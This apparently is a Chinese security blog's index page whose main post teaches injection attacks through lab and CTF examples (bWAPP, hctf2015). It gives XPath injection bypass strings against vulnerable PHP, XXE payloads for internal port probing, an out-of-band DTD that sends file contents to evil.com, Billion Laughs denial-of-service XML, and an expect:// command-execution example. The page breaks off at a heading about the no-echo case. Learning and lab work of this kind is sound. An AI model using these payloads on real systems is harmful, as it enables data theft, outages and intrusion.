<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content><meta name="keywords" content><meta name="author" content="J0k3r"><meta name="copyright" content="J0k3r"><title>J0k3r</title><link rel="shortcut icon" href="/img/fav.png"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><link rel="dns-prefetch" href="https://unpkg.com"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitment/style/default.min.css"><script src="https://cdn.jsdelivr.net/npm/gitment/dist/gitment.browser.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">J0k3r</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">29</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">20</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友链</div><a class="author-info-links__name text-center" href="https://p0sec.net/">p0神</a><a class="author-info-links__name text-center" href="http://seaii-blog.com/">seaii</a><a class="author-info-links__name text-center" href="http://0sec.com.cn/">everglow</a><a class="author-info-links__name text-center" href="http://mengsec.com/">MengChen</a><a class="author-info-links__name text-center" href="http://windylh.com/">Windylh</a><a class="author-info-links__name text-center" href="http://p0desta.com/">p0desta</a><a class="author-info-links__name text-center" href="http://lanvnal.com/">LANVNAL</a><a class="author-info-links__name text-center" href="https://bossgirl.github.io/">八千国家奖学金</a><a class="author-info-links__name text-center" href="http://syf.ac.cn/">7N1ght</a><a class="author-info-links__name text-center" href="http://wzt.ac.cn/">WCatalpa.T</a><a class="author-info-links__name text-center" href="https://daolgts.github.io/">daolgts</a><a class="author-info-links__name text-center" href="https://qingchenldl.github.io">V0W</a><a class="author-info-links__name text-center" href="https://fancyking.ml/">fancyking</a><a class="author-info-links__name text-center" href="http://dxxblog.top/">xx_C1</a><a class="author-info-links__name text-center" href="http://www.cooper111.xyz/">花郎世纪</a><a class="author-info-links__name text-center" href="http://asa9ao.xyz/">Asa9ao</a></div></div></div><nav id="nav" style="background-image: url(https://i.loli.net/2019/03/17/5c8e54b412bc5.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">J0k3r</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">归档</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/about/">关于</a></span></div><div id="site-info"><div id="site-title">J0k3r</div><div id="site-sub-title"></div><div id="site-social-icons"><a class="social-icon" href="https://github.com/zhuxianjin"><i class="fa-github fa"></i></a><a class="social-icon" href="mailto:xavier.chu@foxmail.com"><i class="fa-envelope fa"></i></a><a class="social-icon" href="http://t.cn/ExVP77H"><i class="fa-qq fa"></i></a><a class="social-icon" href="https://music.163.com/#/user/home?id=375588920"><i class="fa-music fa"></i></a></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2018/09/02/py-shop/">基于flask/jinja2的简陋的商店系统</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-09-02</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/flask/">flask</a></span><div class="content"><a id="more"></a>
<h3 id="基于flask-jinja2的简陋的商店系统"><a href="#基于flask-jinja2的简陋的商店系统" class="headerlink" title="基于flask/jinja2的简陋的商店系统"></a>基于flask/jinja2的简陋的商店系统</h3><blockquote>
<p>写的非常简单，可能日后会完善吧</p>
</blockquote>
<ul>
<li>python3.6</li>
<li>需开启mysql服务，首次需运行initdb.py创建数据库（或还原备份的数据库）</li>
<li>再运行app.py并注册账号</li>
</ul>
<p>8.30更新：</p>
<ul>
<li><p>将商品加入数据库，用户登陆后可以在/add添加商品</p>
</li>
<li><p>修复商品预览界面bug</p>
</li>
</ul>
<p>9.2更新：</p>
<ul>
<li>优化initdb.py，防止二次运行删除数据</li>
</ul>
<p><img src="https://i.loli.net/2018/10/23/5bcea2295b726.png" alt="68747470733a2f2f692e6c6f6c692e6e65742f323031382f30382f33312f356238386632363530363436342e706e67.png"></p>
<p>源码见github</p>
<p><a href="https://github.com/zhuxianjin/py-shop" target="_blank" rel="noopener">https://github.com/zhuxianjin/py-shop</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2018/08/15/Windows-domain/">Windows 域渗透</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-08-15</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/windows内网渗透/">windows内网渗透</a></span><div class="content"><p><strong>内网渗透真是博大精深</strong>，测试环境准备起来也有点麻烦，遇到很多问题</p></div><a class="more" href="/2018/08/15/Windows-domain/#more">阅读更多</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2018/08/12/FJssti/">Flask/Jinja2服务端模版注入</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-08-12</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Flask-Jinja2-ssti/">Flask/Jinja2-ssti</a></span><div class="content"><p>SSTI(服务端模版注入)</p></div><a class="more" href="/2018/08/12/FJssti/#more">阅读更多</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2018/08/09/code-inject/">代码注入漏洞</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-08-09</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/代码注入/">代码注入</a></span><div class="content"><a id="more"></a>
<h3 id="Xpath注入"><a href="#Xpath注入" class="headerlink" title="Xpath注入"></a>Xpath注入</h3><p>当xml被用来储存数据时，类似数据库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
<p>xpath则被用来查询xml</p>
<p>Xpath注入即是恶意的查询代码</p>
<p>这里用ichunqiu上一个例子</p>
<p>score.xml:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">class</span> <span class="attr">num</span>=<span class="string">'1'</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">peo</span> <span class="attr">name</span>=<span class="string">'tom'</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">subject</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">foo</span>&gt;</span>english<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">score</span>&gt;</span>60<span class="tag">&lt;/<span class="name">score</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">subject</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">subject</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">foo</span>&gt;</span>chinese<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">score</span>&gt;</span>70<span class="tag">&lt;/<span class="name">score</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">subject</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">password</span>&gt;</span>qwer123<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">peo</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">peo</span> <span class="attr">name</span>=<span class="string">'helen'</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">subject</span>&gt;</span> </span><br><span class="line">                                <span class="tag">&lt;<span class="name">foo</span>&gt;</span>english<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">score</span>&gt;</span>24<span class="tag">&lt;/<span class="name">score</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">subject</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">subject</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">foo</span>&gt;</span>chinese<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">score</span>&gt;</span>34<span class="tag">&lt;/<span class="name">score</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">subject</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">password</span>&gt;</span>woaichishi<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">peo</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">peo</span> <span class="attr">name</span>=<span class="string">'vk'</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">subject</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">foo</span>&gt;</span>english<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">score</span>&gt;</span>100<span class="tag">&lt;/<span class="name">score</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">subject</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">subject</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">foo</span>&gt;</span>chinese<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">score</span>&gt;</span>100<span class="tag">&lt;/<span class="name">score</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">subject</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">password</span>&gt;</span>vk123<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">peo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>score.php:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (file_exists(<span class="string">'score.xml'</span>))&#123;</span><br><span class="line">        $xml = simplexml_load_file(<span class="string">'score.xml'</span>);  <span class="comment">//获取xml文件里面的数据</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'user'</span>]))&#123;</span><br><span class="line">                $user = $_GET[<span class="string">'user'</span>];</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">                <span class="comment">//构造语句</span></span><br><span class="line">                $en_scr = <span class="string">"//peo[@name='&#123;$user&#125;']/subject[contains(foo, 'english')]/score"</span>;</span><br><span class="line">                $ch_scr = <span class="string">"//peo[@name='&#123;$user&#125;']/subject[contains(foo, 'chinese')]/score"</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">                $en_qu = $xml -&gt; xpath($en_scr);</span><br><span class="line">                $ch_qu = $xml -&gt; xpath($ch_scr);</span><br><span class="line">                <span class="keyword">foreach</span> ($en_qu <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> $user.<span class="string">':&lt;br&gt;english is '</span>.$value;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">foreach</span> ($ch_qu <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>.<span class="string">'chinese is '</span>.$value;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'only have three user: vk, tom, helen.'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>$en_scr = &quot;//peo[@name=&#39;{$user}&#39;]/subject[contains(foo, &#39;english&#39;)]/score&quot;;</code>便是xpath路径选取xml节点的语句</p>
<p><code>//peo[@name=&#39;{$user}&#39;]</code>选取所有拥有值为user的name属性的peo元素</p>
<p>contains函数，匹配出他的foo子节点中，信息含有english的部分</p>
<p>找到相应的subject后，score存放分数</p>
<p>xpath的注入还有通过updataxml()函数实现xpath报错注入、xpath盲注</p>
<h3 id="XPath-Injection-Login-Form-bWAPP"><a href="#XPath-Injection-Login-Form-bWAPP" class="headerlink" title="XPath Injection (Login Form) (bWAPP)"></a>XPath Injection (Login Form) (bWAPP)</h3><p>登陆判断部分：</p>
<p><code>$result = $xml-&gt;xpath(&quot;/heroes/hero[login=&#39;&quot; . $login . &quot;&#39; and password=&#39;&quot; . $password . &quot;&#39;]&quot;);</code></p>
<p>闭合单引号，构造</p>
<p><img src="https://i.loli.net/2018/08/09/5b6bb1d848d31.png" alt="s12.png"></p>
<p>这是语句变成<code>/heroes/hero[login=&#39;q&#39; or &#39;1&#39;=&#39;1&#39; and password=&#39;q&#39; or &#39;1&#39;=&#39;1&#39;]</code>,成功登陆</p>
<p>或只在Login里输入<code>q&#39; or 1=1 or &#39;1&#39;=&#39;1</code></p>
<h3 id="XPath-Injection-Search-bwAPP"><a href="#XPath-Injection-Search-bwAPP" class="headerlink" title="XPath Injection (Search) (bwAPP)"></a>XPath Injection (Search) (bwAPP)</h3><p><code>$result = $xml-&gt;xpath(&quot;//hero[contains(genre, &#39;$genre&#39;)]/movie&quot;);</code></p>
<p>构造<code>&#39;)]/password|a[contains(aa,&#39;</code>获取password</p>
<p><img src="https://i.loli.net/2018/08/09/5b6bba0197b0a.png" alt="s13.png"></p>
<h3 id="injection-hctf2015"><a href="#injection-hctf2015" class="headerlink" title="injection(hctf2015)"></a>injection(hctf2015)</h3><p>源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$re = array(&apos;and&apos;,&apos;or&apos;,&apos;count&apos;,&apos;select&apos;,&apos;from&apos;,&apos;union&apos;,&apos;group&apos;,&apos;by&apos;,&apos;limit&apos;,&apos;insert&apos;,&apos;where&apos;,&apos;order&apos;,&apos;alter&apos;,&apos;delete&apos;,&apos;having&apos;,&apos;max&apos;,&apos;min&apos;,&apos;avg&apos;,&apos;sum&apos;,&apos;sqrt&apos;,&apos;rand&apos;,&apos;concat&apos;,&apos;sleep&apos;);</span><br><span class="line">setcookie(&apos;injection&apos;,&apos;c3FsaSBpcyBub3QgdGhlIG9ubHkgd2F5IGZvciBpbmplY3Rpb24=&apos;,time()+100000);</span><br><span class="line">if(file_exists(&apos;t3st.xml&apos;)) &#123;</span><br><span class="line">    $xml = simplexml_load_file(&apos;t3st.xml&apos;);</span><br><span class="line">    $user=$_GET[&apos;user&apos;];</span><br><span class="line">	$user=str_replace($re, &apos; &apos;, $user);</span><br><span class="line">  //  $user=str_replace(&quot;&apos;&quot;, &quot;&amp;apos&quot;, $user);</span><br><span class="line">    $query=&quot;user/username[@name=&apos;&quot;.$user.&quot;&apos;]&quot;;</span><br><span class="line">  </span><br><span class="line">    $ans = $xml-&gt;xpath($query);</span><br><span class="line">    foreach($ans as $x =&gt; $x_value)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $x.&quot;:  &quot; . $x_value;</span><br><span class="line">        echo &quot;&lt;br /&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>类似sql注入，闭合单引号和[],<code>//*</code>选取所有元素,<code>|</code>计算返回两个节点集</p>
<p>payload: <code>?user=q%27]|//*|a[%27</code></p>
<p><img src="https://i.loli.net/2018/08/09/5b6bac6bb30b4.png" alt="s11.png"></p>
<p><a href="http://www.runoob.com/xpath/xpath-syntax.html" target="_blank" rel="noopener">XPath 语法</a></p>
<p><a href="http://www.runoob.com/xpath/xpath-operators.html" target="_blank" rel="noopener">XPath 运算符</a></p>
<h3 id="Json注入"><a href="#Json注入" class="headerlink" title="Json注入"></a>Json注入</h3><p><strong>Json</strong></p>
<blockquote>
<p>JSON: JavaScript Object Notation(JavaScript 对象表示法),是存储和交换文本信息的语法。类似 XML。</p>
</blockquote>
<blockquote>
<p>JSON 具有层级结构（值中存在值）, JSON 是纯文本</p>
</blockquote>
<blockquote>
<p>JSON 可通过 JavaScript 进行解析</p>
</blockquote>
<blockquote>
<p>JSON 数据可使用 AJAX 进行传输</p>
</blockquote>
<p>根据json语法修改数据<code>{&quot;adduser&quot;:[{&quot;username&quot;:&quot;admin1&quot;,&quot;password&quot;:&quot;123456&quot;}]}，可以注入多增加一个 password=&gt;123456&quot;},{&quot;username&quot;:&quot;admin2&quot;,&quot;password&quot;:&quot;123456</code></p>
<p><strong>json劫持</strong></p>
<p>即某个JSON服务或者接口返回有价值的敏感的JSON数组数据，比如/api/xxx攻击者针对这个网站进行JSON劫持攻击，获取敏感信息</p>
<h3 id="XML注入"><a href="#XML注入" class="headerlink" title="XML注入"></a>XML注入</h3><p>有关xml我在<a href="https://zhuxianjin.github.io/2018/06/10/k14-xxe/" target="_blank" rel="noopener">XML External Entity attack/XXE攻击 | J0k3r</a>有文件读取的相关内容</p>
<p><strong>xxe内网信息探测</strong></p>
<p>探测端口：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$xml=&lt;&lt;&lt;EOF</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[  </span><br><span class="line">&lt;!ENTITY port file SYSTEM &quot;http://192.168.0.1:80&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;p&gt;&amp;port;&lt;/p&gt;</span><br><span class="line">EOF;</span><br><span class="line"></span><br><span class="line">$data = simplexml_load_string($xml) ;</span><br><span class="line">echo &quot;&lt;pre&gt;&quot; ;</span><br><span class="line">print_r ($data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>通过DTD参数实体的特性将文件内容拼接到url</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE root[   </span><br><span class="line"> &lt;!ENTITY % file SYSTEM &quot;php://fileter/convert.base64-encode/resource=c:/windows/win.ini&quot;&gt;   </span><br><span class="line"> &lt;!ENTITY % dtd SYSTEM &quot;http://192.168.1.100:8000/evil.dtd&quot;&gt;    </span><br><span class="line"> %dtd;      </span><br><span class="line"> %send;</span><br><span class="line"> ]&gt; </span><br><span class="line"> &lt;root&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
<p> evil.dtd:</p>
<p> <code>&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://evil.com/?content=%file;&#39;&gt;&quot;&gt; %payload;</code></p>
<p> evil.dtd中将%file实体的内容拼接到url后，然后利用burp等工具，查看url请求就能获得需要的内容</p>
<p> <strong>攻击内网网站</strong></p>
<p>利用xxe像内网机器发出payload请求即可</p>
<p> <strong>dos攻击</strong></p>
<p> Billion Laughs 攻击</p>
<blockquote>
<p>Billion laughs attack，xml解析的时候，<lolz></lolz>中间将是一个十亿级别大小的参数，将会消耗掉系统30亿字节的内存。</p>
</blockquote>
<p>POC:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">&lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">&lt;!ELEMENT lolz (#PCDATA)&gt;</span><br><span class="line">&lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure>
<p>或者：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ENTITY a0 &quot;dos&quot; &gt;</span><br><span class="line">&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;</span><br><span class="line">&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;</span><br><span class="line">&lt;!ENTITY a3 &quot;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&quot;&gt;</span><br><span class="line">&lt;!ENTITY a4 &quot;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;a4;&lt;/data&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>POC中中先定义了lol实体，值为”lol”的字符串,后在下面又定义了lol2实体，lol2实体引用10个lol实体，lol3又引用了10个lol2实体的值，依此类推，到了最后在lolz元素中引用的lol9中，就会存在上亿个”lol”字符串<br>此时解析数据时未做特别处理，即可能造成拒绝服务攻击。</p>
</blockquote>
<blockquote>
<p>此外还有一种可能造成拒绝服务的Payload,借助读取/dev/random实现.</p>
</blockquote>
<p><strong>远程命令执行</strong></p>
<p>需要PHP的expect扩展</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$xml=&lt;&lt;&lt;EOF</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTIT ex SYSTEM &quot;expect://whoami&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;p&gt;&amp;ex;&lt;/p&gt;</span><br><span class="line">EOF;</span><br><span class="line"></span><br><span class="line">$data = simplexml_load_string($xml) ;</span><br><span class="line">echo &quot;&lt;pre&gt;&quot; ;</span><br><span class="line">print_r ($data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>无回显情况：</p>
